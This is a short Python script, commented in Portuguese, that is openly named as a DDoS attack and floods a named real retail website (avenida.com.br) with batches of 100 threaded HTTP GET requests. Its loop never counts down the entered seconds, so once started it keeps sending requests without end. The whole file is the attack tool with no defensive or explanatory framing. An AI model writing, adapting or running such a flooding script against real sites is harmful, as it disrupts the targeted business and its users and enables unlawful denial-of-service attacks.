import requests
import threading
seconds = int(input('QUantos segundos de attack? '))
def ddos_attack():
    url = 'https://www.avenida.com.br/'
    response = requests.get(url)
    print(f'Response status code: {response.status_code}')

def main():
    while seconds:
        num_threads = 100
        threads = []
        for _ in range(num_threads):
            thread = threading.Thread(target=ddos_attack)
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

if __name__ == '__main__':
    main()